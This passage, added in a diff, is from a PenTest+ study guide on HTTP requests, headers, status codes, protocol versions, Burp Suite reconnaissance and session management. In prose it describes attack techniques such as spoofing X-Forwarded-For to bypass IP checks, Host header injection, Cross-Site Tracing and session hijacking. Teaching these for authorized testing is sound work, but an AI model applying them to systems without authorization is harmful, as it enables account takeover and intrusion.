@@ -12765,3 +12765,1251 @@ The key professional takeaway: wireless security assessment requires constantly 
 
 ---
 ***— End of Module 5, Section 5.2 —***
+
+---
+
+# Module 6 — Section 6.1
+# Overview of Web Application-Based Attacks for Security Professionals and the OWASP Top 10
+
+> **CompTIA PenTest+ / Ethical Hacking Certification Series**
+> *Professional Reference Guide — GitHub Edition*
+> *The complete foundation of web application security — from protocol to attack taxonomy*
+
+---
+
+## Table of Contents — Section 6.1
+
+- [6.1.1 Overview — Why Web Applications Are the Most Attacked Surface on Earth](#611-overview--why-web-applications-are-the-most-attacked-surface-on-earth)
+- [6.1.2 The HTTP Protocol — The Language Everything Speaks](#612-the-http-protocol--the-language-everything-speaks)
+- [6.1.3 Practice — Reading HTTP Traffic Like a Security Professional](#613-practice--reading-http-traffic-like-a-security-professional)
+- [6.1.4 Web Sessions — How the Stateless Protocol Pretends to Have Memory](#614-web-sessions--how-the-stateless-protocol-pretends-to-have-memory)
+- [6.1.5 Practice — Attacking and Analyzing Web Sessions](#615-practice--attacking-and-analyzing-web-sessions)
+- [6.1.6 OWASP Top 10 — The Map of the Web Application Attack Surface](#616-owasp-top-10--the-map-of-the-web-application-attack-surface)
+- [6.1.7 Lab — Website Vulnerability Scanning](#617-lab--website-vulnerability-scanning)
+- [6.1.8 Lab — Using the GVM Vulnerability Scanner](#618-lab--using-the-gvm-vulnerability-scanner)
+
+---
+
+## 6.1.1 Overview — Why Web Applications Are the Most Attacked Surface on Earth
+
+### The Scale of the Problem
+
+Before diving into any technique or tool, we need to answer the most fundamental question: why do penetration testers care about web applications more than almost anything else?
+
+The answer is pure accessibility. A misconfigured login form, a vulnerable API endpoint, a poorly designed session management system — any of these can be reached by anyone on the planet with an internet connection and a browser. There are no geographic barriers. There are no locked doors. An attacker sitting in an apartment can probe a bank's web application from a laptop as easily as they could probe a neighbor's Wi-Fi.
+
+The numbers back this up. Verizon's 2024 Data Breach Investigations Report found that web application attacks were the primary attack vector in the majority of confirmed data breaches across all industries. IBM's 2024 Cost of a Data Breach Report puts the average cost of a single web application breach at over four million dollars. And these numbers come despite decades of security awareness, billions of dollars in defensive tooling, and thousands of available security frameworks and libraries.
+
+Why does the problem persist? Because the web is genuinely, architecturally complex. A modern web application is not a single thing — it is a layered system involving browsers, HTTP servers, application servers, databases, caching layers, load balancers, CDN providers, third-party APIs, JavaScript frameworks, mobile apps, and more. Every boundary between these components is a potential vulnerability. Developers are under constant pressure to build features and ship code. Security is evaluated at the end, not baked into the beginning. And the OWASP Foundation — one of the most respected cybersecurity bodies in the world — has catalogued ten categories of vulnerabilities that appear, year after year, in virtually every application they test.
+
+### What This Section Builds
+
+Section 6.1 is the foundation for everything that follows in Module 6. If you do not understand HTTP deeply, SQL injection looks like magic. If you do not understand how sessions work, CSRF attacks seem inexplicable. If you do not know the OWASP Top 10, you do not have a structured way to approach a web application assessment.
+
+This section builds three layers of understanding:
+
+The first layer is the protocol — HTTP. This is the language in which every web attack is conducted. Understanding it at the byte level is not optional for a professional penetration tester.
+
+The second layer is web sessions — how applications manage state on top of a stateless protocol, and why every mechanism used to do so creates new attack surface.
+
+The third layer is the OWASP Top 10 — the industry's consensus map of where web applications break, why they break there, and what the attack and defense look like for each category.
+
+### The Mental Model to Carry Throughout This Module
+
+Think of a web application assessment not as "running tools against a website" but as "having a conversation with a server in the language of HTTP and learning from what it says back." Every response the server sends — its headers, its status codes, its error messages, its redirects — is information. Every parameter the application accepts is a potential injection point. Every piece of state the application remembers is a potential target.
+
+A skilled web application penetration tester is, at their core, a very careful reader of HTTP traffic who notices things that automated tools miss.
+
+---
+
+## 6.1.2 The HTTP Protocol — The Language Everything Speaks
+
+### What HTTP Is and Why Understanding It Deeply Matters
+
+HTTP stands for HyperText Transfer Protocol. It was invented in 1989 by Tim Berners-Lee as part of the original World Wide Web design, standardized in RFC 1945 (HTTP/1.0) in 1996, and has been the foundational protocol of the web ever since.
+
+HTTP is an **application-layer protocol** sitting at Layer 7 of the OSI model. Below it, at Layer 4, runs TCP — the reliable, connection-oriented transport protocol that handles packet ordering, delivery confirmation, and retransmission. When you make an HTTP request, your operating system first establishes a TCP connection to the server, and HTTP messages flow through that established connection.
+
+HTTPS is not a separate protocol. It is HTTP running inside a TLS (Transport Layer Security) encrypted tunnel. The application data — the HTTP request and response — is identical in both cases. The difference is that HTTPS wraps that data in encryption before it leaves your machine, so anyone intercepting the network traffic between you and the server sees only encrypted gibberish rather than the actual HTTP messages.
+
+Here is the single most important thing to understand about HTTP before learning any web vulnerability: **HTTP is completely stateless**. Every single request is treated by the server as an independent transaction. The server processes it, sends a response, and immediately forgets the request ever happened. The next request you send — even a millisecond later, even from the exact same browser — is treated as if it came from a complete stranger.
+
+This statelessness is not an oversight. It is intentional design. It makes HTTP servers vastly simpler and more scalable — any server in a cluster can handle any request because no server needs to maintain memory of previous interactions. But this statelessness creates the problem that generates half of all web security vulnerabilities: how does the server remember who you are? We will address this completely in Section 6.1.4. For now, keep this question in mind as we build the foundation.
+
+### The Request-Response Model — The Heartbeat of the Web
+
+Everything in HTTP is a request followed by a response. The client (your browser, curl, Burp Suite, a mobile app) sends a request. The server processes it and sends back a response. That is the entire model. Every web interaction you have ever had — every page load, every login, every Google search, every API call — followed this exact structure.
+
+#### Anatomy of an HTTP Request
+
+An HTTP request has four distinct parts: the request line, the headers section, a blank line (which signals the end of headers), and optionally a body. Let us look at a real login request and dissect every element:
+
+```
+POST /api/v1/auth/login HTTP/1.1
+Host: bank.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 58
+Origin: https://bank.example.com
+Referer: https://bank.example.com/login
+Cookie: _ga=GA1.2.1234567890; tracking_id=7f3a2b1c
+Connection: keep-alive
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+
+{"username":"alice@bank.com","password":"MyP@ssw0rd2024"}
+```
+
+**The Request Line: `POST /api/v1/auth/login HTTP/1.1`**
+
+This single line contains three pieces of critical information. The method (POST) tells the server what action to perform. The path (/api/v1/auth/login) tells the server which resource to act upon. The version (HTTP/1.1) tells both sides which protocol rules apply.
+
+**HTTP Methods — What They Mean and Why Each Matters for Security**
+
+The method is one of the first things a penetration tester looks at because it shapes the entire behavior of the request.
+
+**GET** requests retrieve a resource and should never cause side effects. The design intention is that GET is "safe" — you can send it multiple times and nothing changes. The critical security implication is that GET parameters appear in the URL: `https://example.com/search?query=value&user=123`. These URL parameters appear in browser history, server access logs, corporate proxy logs, and the HTTP Referer header when the user clicks a link to another site. Never put sensitive data — passwords, session tokens, personal information — in GET parameters. Many developers know this in theory but violate it under deadline pressure.
+
+**POST** requests send data to the server to create or process something. The data goes in the request body, not the URL. This makes POST the correct choice for login forms, payment submissions, and any sensitive data. However — and this is a critical point many beginners misunderstand — POST is not inherently secure. Without HTTPS, the POST body is just as readable to a network eavesdropper as a GET URL. POST gives you privacy from browser history and logs; it does not give you encryption.
+
+**PUT** requests replace a resource entirely. **PATCH** requests partially update a resource. If an application exposes PUT or PATCH endpoints without proper authorization checks, an attacker can overwrite other users' data — or administrative data — trivially. During a web application assessment, always test all HTTP methods against every endpoint, not just GET and POST.
+
+**DELETE** requests remove a resource. An unauthenticated or improperly authorized DELETE endpoint is catastrophic — it allows deleting any resource. Finding a DELETE endpoint accessible to regular users when it should require administrative privileges is a critical finding.
+
+**OPTIONS** requests ask the server what methods it supports for a given URL. The server responds with an `Allow` header listing permitted methods. This is used by browsers for CORS preflight checks (discussed below). For penetration testers, sending OPTIONS to every endpoint gives you a map of what methods exist before you even test them individually.
+
+**HEAD** requests work like GET but the server sends only the response headers, not the body. Because the body is omitted, HEAD responses are very fast. Penetration testers use HEAD for rapid reconnaissance — checking status codes, response headers, and server technology across many URLs without downloading the full response bodies.
+
+**TRACE** requests are designed for diagnostic purposes — the server echoes back the entire request it received, including all headers. This enables the Cross-Site Tracing (XST) attack: if TRACE is enabled on a server that also serves JavaScript, an attacker can use JavaScript to send a TRACE request and read the echoed response, potentially exposing HttpOnly cookies that JavaScript should not be able to access. TRACE should always be disabled in production. If you find it enabled, document it as a finding.
+
+**Headers — The Metadata Layer Where Security Lives**
+
+HTTP headers are key-value pairs that carry metadata about the request or response. They are enormously important for security professionals because they reveal the application's technology, configuration decisions, and security posture. Learning to read headers fluently is one of the highest-leverage skills in web application testing.
+
+**Request Headers That Matter for Security:**
+
+`Host: bank.example.com`
+This header tells the server which virtual host to serve the request for. Servers that host multiple domains on one IP address use this header to route requests. This matters for security because some applications use the Host header to construct URLs in password reset emails, absolute redirect URLs, and other places. If the application blindly trusts the Host header without validation, an attacker can manipulate it to redirect sensitive links (like password reset links) to attacker-controlled servers. This is called a Host Header Injection attack.
+
+`User-Agent: Mozilla/5.0...`
+Identifies the browser software making the request. Applications sometimes use this for browser-specific behavior, access control (blocking certain user agents), or analytics. From an attacker's perspective, this can be trivially forged — changing User-Agent to "Googlebot" or "SecurityScanner" is one line in Burp Suite. Never rely on User-Agent for security decisions.
+
+`Cookie: _ga=GA1.2.1234567890; tracking_id=7f3a2b1c`
+The Cookie header sends back cookies that the server previously set. This is the primary mechanism for session management (discussed in full in 6.1.4). Every request to the matching domain automatically includes applicable cookies — which is exactly what enables CSRF attacks, because the browser sends cookies on requests it did not intend to make.
+
+`Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`
+Used for API authentication, most commonly with JWT (JSON Web Token) Bearer tokens. This header does not automatically persist like cookies — the JavaScript application must explicitly include it in each request. This makes JWT Bearer auth less vulnerable to CSRF (you cannot forge a header from another website via a form submission) but more vulnerable to XSS theft (if your JavaScript is compromised, your Bearer tokens are too).
+
+`Content-Type: application/json`
+Tells the server how the request body is formatted. This is critical for penetration testers because the content type determines which vulnerability classes to test. A JSON body requires different SQL injection and XSS payloads than a URL-encoded form body. An XML body opens up XXE (XML External Entity) attack possibilities that JSON bodies do not. A `multipart/form-data` body indicates file uploads are happening.
+
+`Referer: https://bank.example.com/login`
+Note the historical misspelling — this should be "Referrer" but the typo made it into the RFC and has never been corrected. This header tells the server which page the request came from. Applications sometimes use this for security decisions (blocking requests that did not come from the expected page). Attackers forge it trivially. It also leaks information — if the Referer header from a request contains a URL with sensitive parameters, those parameters are now logged on the destination server.
+
+`Origin: https://bank.example.com`
+Used in CORS (Cross-Origin Resource Sharing) requests and CSRF-relevant scenarios. The Origin header cannot be set by JavaScript from a different origin — it is enforced by the browser. This makes it a more reliable source-of-truth for cross-origin security decisions than Referer.
+
+`X-Forwarded-For: 10.0.0.5`
+Added by load balancers and reverse proxies to indicate the original client IP address. Applications that implement IP-based access controls — allowing admin access only from the internal network, for example — sometimes check this header. But here is the key: `X-Forwarded-For` can be set to any value by the client. If an application restricts admin access to `127.0.0.1` and checks `X-Forwarded-For` to determine the client IP, an attacker can simply add `X-Forwarded-For: 127.0.0.1` to their request and bypass the restriction entirely. This is a common and easily overlooked finding.
+
+**Response Headers That Reveal Security Posture:**
+
+Response headers are your security posture checklist for a web application. The presence or absence of specific security headers tells you a great deal about how the application handles various attack classes.
+
+`Server: nginx/1.24.0` — Reveals web server technology and version. Should be removed or set to a generic value in production. When you find it, cross-reference against vulnerability databases for the specific version. Even a minor version difference can be the line between patched and unpatched.
+
+`X-Powered-By: PHP/8.1.0` — Reveals server-side language and runtime version. Again, this should be removed. PHP version information maps directly to known CVEs.
+
+`Set-Cookie: session_id=7f3a9b2c1d8e4f6a; Path=/; HttpOnly; Secure; SameSite=Strict`
+This is one of the most important headers to analyze in any web application. The flags on this header determine whether the session can be stolen via XSS (HttpOnly prevents this), whether it can be sniffed on HTTP (Secure prevents this), and whether it is vulnerable to CSRF (SameSite controls this). A missing flag is a vulnerability. Full details in Section 6.1.4.
+
+`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com`
+CSP is a browser-enforced security mechanism that restricts which sources of content — scripts, stylesheets, images, fonts, frames — the page may load. A strong CSP is the primary defense against XSS exploitation. Even if an attacker injects a script tag, CSP prevents the browser from executing it unless the source is whitelisted. A missing CSP is not a vulnerability by itself — but it means XSS is far more impactful if found.
+
+`X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`
+This header controls whether the page can be embedded in an iframe from another domain. Missing this header enables Clickjacking (covered in Section 6.9). The Content-Security-Policy `frame-ancestors` directive is the modern replacement, but X-Frame-Options is still checked for compatibility.
+
+`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
+HSTS instructs browsers to always use HTTPS for this domain, for the specified duration (31536000 seconds = 1 year). Once a browser receives this header, it will refuse to make unencrypted HTTP connections to the domain for that period — even if the user types `http://`. The `includeSubDomains` flag extends this to all subdomains. The `preload` flag enables the domain to be included in browser preload lists, so HSTS is enforced even on the very first visit. A missing HSTS header allows SSL stripping attacks on the first connection.
+
+`Access-Control-Allow-Origin: https://app.example.com`
+CORS headers control which origins are permitted to make cross-origin requests and read the responses. A misconfigured CORS policy — particularly one that reflects any Origin header (`Access-Control-Allow-Origin: *` or dynamically mirroring the request's Origin) combined with `Access-Control-Allow-Credentials: true` — allows a malicious website to make authenticated cross-origin requests and read the responses. This is a critical vulnerability class.
+
+`X-Content-Type-Options: nosniff`
+Prevents browsers from guessing (sniffing) the content type of a response. Without this, a browser might interpret a text file as HTML and execute embedded scripts. With it, the browser must use the declared Content-Type. Missing this is typically medium severity — it enables certain content injection scenarios.
+
+`Referrer-Policy: strict-origin-when-cross-origin`
+Controls how much information is included in the Referer header on outgoing requests. Sensitive applications (healthcare, finance, legal) should set this to prevent leaking sensitive URL parameters to third parties.
+
+`Permissions-Policy: geolocation=(), camera=(), microphone=()`
+Controls which browser features (geolocation, camera, microphone, payment) are enabled in the document. A missing or permissive policy may allow scripts to access hardware features unexpectedly.
+
+### HTTP Status Codes — Reading What the Server Tells You
+
+Status codes are three-digit numbers in every HTTP response that communicate the outcome of the request. For penetration testers, status codes are not just informational — they reveal the application's internal behavior and directly inform attack strategy.
+
+**1xx — Informational**
+Rarely encountered in web application testing. `100 Continue` is sometimes sent before large POST bodies.
+
+**2xx — Success**
+`200 OK` — The request succeeded and the body contains the response. Standard success.
+`201 Created` — A resource was successfully created (common in REST APIs after POST).
+`204 No Content` — Success, but no body. Common for DELETE responses and some PUT/PATCH operations.
+`206 Partial Content` — Partial file delivery. Important in file download functionality.
+
+**3xx — Redirection**
+`301 Moved Permanently` — Resource permanently relocated. Browsers cache this aggressively.
+`302 Found` — Temporary redirect. The most common redirect type in web applications.
+`304 Not Modified` — Client's cached version is still valid. No content sent.
+The security implication: redirects can be manipulated. An Open Redirect vulnerability occurs when an application redirects to a URL from user input without validation, allowing attackers to redirect victims to malicious sites. Look for parameters like `?redirect=`, `?next=`, `?url=`, `?return=` in redirect chains.
+
+**4xx — Client Errors**
+This range is the penetration tester's reconnaissance goldmine.
+
+`400 Bad Request` — The server cannot parse the request. Sometimes reveals parsing details in the error message.
+`401 Unauthorized` — Authentication is required. The server is telling you this endpoint exists but requires credentials.
+`403 Forbidden` — You are authenticated, but not authorized for this resource. This is crucial: a 403 means the resource EXISTS. During directory brute forcing, a 403 is a finding — it reveals a hidden path that requires authorization. A 404 means "not found" (or the server is lying).
+`404 Not Found` — Resource does not exist. Or does it? Security-hardened applications return 404 for unauthorized resources instead of 403 specifically to avoid revealing that the resource exists. This is called "security through ambiguity" — not a strong control, but a valid defense layer.
+`405 Method Not Allowed` — The resource exists but the HTTP method is wrong. Very useful during method enumeration — it tells you the resource is there but you need a different method.
+`429 Too Many Requests` — Rate limiting is active. The application has noticed your rapid requests. Slow down or rotate infrastructure.
+
+**5xx — Server Errors**
+`500 Internal Server Error` — The server crashed processing your request. Often reveals stack traces, framework versions, database types, file paths, and internal code structure in the response body. A 500 triggered by your input is almost always a vulnerability indicator — something you sent caused unexpected behavior.
+`502 Bad Gateway` — The reverse proxy could not reach the backend. Reveals that a proxy architecture is in use.
+`503 Service Unavailable` — Server is overloaded or in maintenance. Sometimes caused by your own DoS testing.
+
+**The key insight about status codes:** When you are brute-forcing directories, fuzzing parameters, or testing inputs, you are not just looking for "success." You are watching for differences. A parameter that returns 200 for normal input and 500 for your SQL injection payload has told you something critical, even if you cannot see the full database. A directory that returns 403 instead of 404 exists. An endpoint that returns a different response size for one payload than all others has reacted to your input uniquely. Status codes and response differences are how web applications leak information about their internal behavior.
+
+### HTTP Versions — The Evolution and Its Security Implications
+
+Understanding HTTP versions matters because different versions create different attack surfaces, different behavior in security tools, and different requirements for your testing methodology.
+
+**HTTP/1.0 (1996)**
+One TCP connection per request-response pair. After each response, the connection closes. Sends one request at a time and waits for the complete response before sending the next. Extremely inefficient for modern web pages that require dozens of resources. Almost never seen in real assessments today except in very legacy systems.
+
+**HTTP/1.1 (1997 — still the baseline)**
+Introduced persistent connections (keep-alive), meaning the TCP connection stays open for multiple request-response pairs. This is enormously more efficient. Also introduced chunked transfer encoding, allowing responses to be sent in pieces before their full size is known.
+
+HTTP/1.1 is text-based — the protocol messages are human-readable ASCII. This is why you can type raw HTTP/1.1 in telnet or netcat and it works. This is also what makes Burp Suite's Repeater so intuitive — you are literally editing text.
+
+HTTP/1.1 suffers from **head-of-line blocking**: if you send three requests on a persistent connection, the second cannot be processed until the first response arrives, and the third cannot begin until the second response arrives. Requests are serialized.
+
+Most importantly for security professionals: HTTP/1.1 is what Burp Suite shows you by default and what most security tooling assumes. Even when the browser negotiates HTTP/2 with the server, Burp Suite transparently translates — you see HTTP/1.1 in the proxy, and Burp handles the HTTP/2 wire format on your behalf.
+
+**HTTP/2 (2015)**
+HTTP/2 was a major architectural redesign, solving the performance problems of HTTP/1.1. The key changes:
+
+Binary framing: HTTP/2 is a binary protocol, not text. HTTP/1.1 headers and bodies are converted to binary frames. This makes it more efficient for machines to parse but less human-readable. You cannot type HTTP/2 by hand — it requires a proper implementation.
+
+Multiplexing: Multiple requests can be in-flight simultaneously over a single TCP connection. The head-of-line blocking problem disappears at the HTTP level (though it persists at the TCP level).
+
+Header compression (HPACK): Headers are compressed using a specialized algorithm. Since the same headers are sent on virtually every request (Host, User-Agent, Authorization, Cookie), this is significant bandwidth savings.
+
+Server push: The server can proactively send resources the client will need before the client asks for them.
+
+**HTTP/2 security implications:**
+The binary format means traditional text-based IDS signatures for HTTP/1.1 attacks do not work directly against HTTP/2 traffic. This has been used in evasion scenarios. HTTP/2 also introduced new attack classes: **HTTP/2 Request Smuggling** — exploiting inconsistencies between how HTTP/2 frontend proxies and HTTP/1.1 backend servers parse the stream — is one of the most powerful web attack techniques discovered in recent years (documented by James Kettle/PortSwigger). Additionally, some servers support HTTP/2 cleartext (h2c upgrades) which can be used to bypass security middleware that only inspects HTTPS traffic.
+
+**HTTP/3 (2022 — RFC 9114)**
+HTTP/3 is the most radical change to the HTTP protocol stack in its history. It does not use TCP at all. Instead, it uses **QUIC** — a protocol built on UDP that implements its own reliable delivery, flow control, and congestion management.
+
+The rationale: TCP's reliability mechanisms cause a specific problem called TCP-level head-of-line blocking. If a single TCP packet is lost, all data behind it in the stream must wait, even data that belongs to completely independent HTTP streams. QUIC, being UDP-based, allows independent streams to continue even when one stream has a lost packet.
+
+QUIC also integrates TLS 1.3 directly — the cryptographic and transport handshakes happen simultaneously, reducing connection establishment from two round trips (TLS 1.2 over TCP) to one round trip, or even zero for repeated connections (0-RTT). HTTP/3 mandates TLS 1.3 — there is no unencrypted HTTP/3.
+
+**HTTP/3 security implications for penetration testers:**
+HTTP/3 runs over UDP port 443. Firewalls and network appliances that assume all web traffic uses TCP port 443 may inadvertently allow HTTP/3 traffic through rules designed for TCP. Packet capture tools that rely on TCP inspection (Wireshark's default TCP reassembly, many IDS systems) may struggle with QUIC's UDP-based traffic. Your proxy (Burp Suite) needs specific configuration to handle HTTP/3 traffic. The 0-RTT feature has theoretically exploitable replay attack implications. As of 2025, major platforms (Google, Meta, Cloudflare) have widely deployed HTTP/3, making it increasingly relevant in web application assessments.
+
+### HTTPS — What It Protects and What It Does Not
+
+HTTPS is HTTP encrypted by TLS. This is worth being extremely precise about because the common understanding is both correct and dangerously incomplete.
+
+**What HTTPS protects:**
+- The content of every HTTP request and response body
+- All HTTP headers (including cookies, Authorization tokens, form data)
+- The URL path and query parameters (the path after the domain is encrypted)
+- Integrity — messages cannot be tampered with in transit without detection
+
+**What HTTPS does not protect:**
+- The domain name you are connecting to (visible in DNS queries and TLS SNI — Server Name Indication, which is the unencrypted field in the TLS handshake where the client tells the server which hostname it wants)
+- The IP address of the server
+- Timing and size of requests and responses (traffic analysis)
+- Any application-layer vulnerability (SQL injection, XSS, CSRF, SSRF — all work identically over HTTPS)
+
+That last point is the critical one for every security conversation. **The padlock icon in your browser means the channel is encrypted. It says absolutely nothing about whether the application is secure.** A web application can be fully HTTPS-only and simultaneously riddled with every vulnerability in the OWASP Top 10. The lock is a channel guarantee, not an application guarantee.
+
+---
+
+## 6.1.3 Practice — Reading HTTP Traffic Like a Security Professional
+
+### Setting Up Burp Suite as Your Window Into HTTP
+
+The single most important skill to practice here is reading raw HTTP traffic. The browser hides everything — it renders the page, you see the visual result, and you know nothing about the underlying communication. Burp Suite removes this hiding layer entirely. Every request your browser makes, every response the server sends, is laid bare — every header, every parameter, every cookie, every redirect.
+
+Setting up Burp Suite as an intercepting proxy:
+
+On Kali Linux, Burp Suite Community Edition is pre-installed. Launch it from the applications menu or terminal (`burpsuite`). Navigate to Proxy → Options → Proxy Listeners. The default listener is `127.0.0.1:8080`. Configure your browser (or use Burp's built-in browser) to proxy through `127.0.0.1:8080`.
+
+Once configured, every request your browser makes passes through Burp. In the Proxy → Intercept tab, with interception on, you can read and modify each request before it is sent. The HTTP History tab shows every request and response in chronological order. This is your intelligence feed.
+
+### What to Look For When You First Open a Web Application
+
+When you load a new web application for the first time in an assessment, do not just browse it visually. Open Burp and watch the HTTP history as you explore. Train yourself to look for:
+
+**Server and technology disclosure:** Check every response's `Server` and `X-Powered-By` headers. Even if the homepage hides these, error pages and API endpoints often reveal them.
+
+**Security headers:** For each application, check the primary responses for the presence or absence of: `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`. Document each missing header — they are valid findings.
+
+**Cookie security flags:** When you receive `Set-Cookie` headers, check every flag. Missing `HttpOnly` means XSS can steal the cookie. Missing `Secure` means the cookie is sent over HTTP. Missing `SameSite` leaves the door open for CSRF.
+
+**URL structure patterns:** Look for numeric IDs in URLs — `/users/1042`, `/orders/77891`, `/api/documents/453`. These are IDOR candidates. Look for patterns suggesting database table names, internal system names, or backend frameworks in URL structure.
+
+**JavaScript files:** Burp captures all JavaScript file requests. Review them in the Site Map. JS files frequently contain: API endpoint paths, environment-specific comments, authentication logic, hardcoded API keys or credentials, and development-time debugging code left in production.
+
+**API calls:** Single-page applications and mobile backends make extensive API calls (JSON over HTTP). These appear in Burp's history and are often much less secured than the web UI because developers assume only the official app will call them.
+
+**Error conditions:** Deliberately cause errors — navigate to nonexistent pages, submit invalid data types in forms, send malformed JSON bodies. What do error responses reveal? Stack traces show the framework and language. SQL error messages show the database type and sometimes query structure. File path errors reveal server directory structure.
+
+### The Recon Checklist for the First 30 Minutes
+
+When you start a web application assessment, before you run any active tools, spend 30 minutes doing this manually:
+
+Browse every page linked from the main navigation. Observe the URL structures. Submit every form with legitimate data to see normal behavior. Log in if accounts are provided. Use the application as intended.
+
+While doing this in Burp:
+- Note all the domains and subdomains the application contacts (visible in the HTTP history target column)
+- Note all authentication mechanisms (cookie-based sessions, JWT, OAuth flows)
+- Note all file upload functionality
+- Note any functionality that takes a URL as input (link preview, webhook, import from URL)
+- Note any numeric IDs in URLs or request parameters
+- Note any admin or privileged functionality even if your account cannot access it
+
+This manual reconnaissance phase tells you where to focus your testing time and which vulnerability classes are most likely relevant. The automated tools come after — they run faster against a scope you already understand.
+
+---
+
+## 6.1.4 Web Sessions — How the Stateless Protocol Pretends to Have Memory
+
+### The Problem HTTP Statelesness Creates
+
+We established that HTTP is stateless. But websites clearly maintain state — you log in once and the site knows who you are for an entire session. How?
+
+This is a fundamental engineering challenge. The web was originally designed for static documents, not applications that maintain user state across multiple interactions. As the web evolved into an application platform, a series of state management mechanisms were layered on top of the fundamentally stateless HTTP protocol.
+
+Understanding these mechanisms is essential for web security because each one — cookies, sessions, tokens — creates specific, exploitable vulnerabilities.
+
+### How Sessions Work — The Complete Mechanism
+
+The session lifecycle works like this:
+
+**Step 1: Authentication**
+You send your credentials to the login endpoint. The server validates them against its database. If valid, the server needs a way to "remember" that you authenticated so it does not require you to log in for every subsequent page.
+
+**Step 2: Session Creation**
+The server creates a session record in its session store. This might be an in-memory structure like Redis, a database table, or even the filesystem. The session record stores data about your authenticated state — your user ID, your role, your permissions, potentially your preferences. Something like:
+
+```json
+{
+  "session_id": "7f3a9b2c1d8e4f6a3b2c9d8e7f3a9b2c",
+  "user_id": 10042,
+  "role": "admin",
+  "created_at": "2026-07-16T09:30:00Z",
+  "expires_at": "2026-07-16T17:30:00Z",
+  "ip_address": "192.168.1.100"
+}
+```
+
+**Step 3: Session ID Delivery**
+The server sends you the session ID (just the ID, not all the session data) via a `Set-Cookie` header in the login response:
+
+```
+HTTP/1.1 200 OK
+Set-Cookie: session_id=7f3a9b2c1d8e4f6a3b2c9d8e7f3a9b2c; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=28800
+```
+
+**Step 4: Automatic Cookie Transmission**
+Your browser stores this cookie and automatically attaches it to every subsequent request to `bank.example.com`:
+
+```
+GET /dashboard HTTP/1.1
+Host: bank.example.com
+Cookie: session_id=7f3a9b2c1d8e4f6a3b2c9d8e7f3a9b2c
+```
+
+**Step 5: Session Lookup**
+The server receives this request, extracts the session ID from the Cookie header, looks it up in the session store, finds your session record, and from that knows you are authenticated as user 10042 with admin role. It processes the request accordingly.
+
+The session ID is just a reference key. The actual data lives server-side in the session store. The browser holds only the key.
+
+### Why Session IDs Must Be Cryptographically Random
+
+The session ID is the key to your authenticated identity. If an attacker obtains your session ID, they can impersonate you completely — without knowing your password, without your phone for MFA, without any other credential. They simply need to include your session ID in a Cookie header, and the server will think they are you.
+
+This attack is called **session hijacking**, and it is one of the most immediately devastating attacks in web security. A single captured session ID can give an attacker full access to an account for the duration of the session — which on poorly designed sites can be weeks or months.
+
+For session IDs to be secure against brute force and prediction attacks, they must be:
+
+**Generated using a CSPRNG:** A Cryptographically Secure Pseudo-Random Number Generator produces values that are computationally impossible to predict. Standard random number functions like JavaScript's `Math.random()`, PHP's `rand()`, or Python's `random` module are NOT cryptographically secure. They are designed for statistical distributions, not unpredictability. A session ID generated with `rand()` can be predicted if an attacker captures a few session IDs and identifies the seed or state of the generator. Use `secrets` in Python, `crypto.randomBytes()` in Node.js, `random_bytes()` in PHP, `SecureRandom` in Java.
+
+**Long enough to resist brute force:** Session IDs should have at least 128 bits of entropy. At 128 bits, even if an attacker could try a billion session IDs per second, it would take longer than the age of the universe to find a valid one statistically. Many frameworks generate 128 or 256-bit session IDs by default — but some older frameworks still generate dangerously short IDs.
+
+**Not derived from predictable data:** A session ID that incorporates `base64(username + timestamp)` is not random — it is deterministic. An attacker who knows your username and approximately when you logged in can compute your session ID. Session IDs must be completely independent of any user-specific data.
+
+**Invalidated server-side on logout:** This is one of the most commonly missed requirements. When a user logs out, the server must delete the session record from the session store — not just tell the browser to delete the cookie. If only the client-side cookie is cleared but the server-side session persists, the session is still valid. Anyone who captured or observed the session ID earlier (from a shared browser, from a network sniff, from logs) can replay it. The only correct logout is server-side session invalidation.
+
+**Regenerated on privilege change:** Whenever a user's privilege level changes — most importantly, upon successful login — the server must generate a new session ID and invalidate the old one. This prevents **session fixation attacks**.
+
+### Cookie Security Flags — The Defense Mechanisms
+
+When the server sets a cookie, it can attach flags that control the cookie's security behavior. Understanding these flags is essential because their absence creates directly exploitable vulnerabilities.
+
+**The HttpOnly Flag**
+
+`Set-Cookie: session_id=abc; HttpOnly`
+
+HttpOnly prevents JavaScript from reading the cookie. When HttpOnly is set, `document.cookie` returns the cookie name but not its value. The cookie exists in the browser's cookie jar and is still sent with HTTP requests — but JavaScript code running in the page cannot read it.
+
+Why this matters: XSS (Cross-Site Scripting) attacks work by injecting malicious JavaScript into a page. The most common goal of XSS is session theft — the injected script reads `document.cookie` and sends the session ID to the attacker. HttpOnly blocks this specific theft vector.
+
+What HttpOnly does NOT do: It does not prevent the cookie from being sent with HTTP requests. So CSRF attacks are completely unaffected — the browser still sends the HttpOnly cookie on every request to the domain, including forged ones from malicious pages.
+
+**The Secure Flag**
+
+`Set-Cookie: session_id=abc; Secure`
+
+Secure tells the browser to only transmit this cookie over HTTPS connections, never over plain HTTP. Without Secure, if a user visits any HTTP version of the site — even accidentally, through an old bookmark or an HTTP link — the browser sends the cookie in cleartext over the unencrypted connection, where a network eavesdropper can capture it.
+
+This is especially relevant in scenarios where HTTPS is deployed but HTTP is not explicitly redirected, or where mixed-content situations exist.
+
+**The SameSite Flag**
+
+`Set-Cookie: session_id=abc; SameSite=Strict`
+
+SameSite controls when the cookie is included in cross-site requests. This is the primary cookie-level defense against CSRF (Cross-Site Request Forgery).
+
+`SameSite=Strict` — The cookie is only sent when the request originates from the same site. Cross-site navigations (following a link from another website) and cross-site requests (fetches, form submissions, image loads) from other domains will NOT include this cookie. Maximum CSRF protection. The tradeoff: if you link to your site from an email or social media, the initial request will not include the cookie, so the user will appear logged out and need to re-authenticate.
+
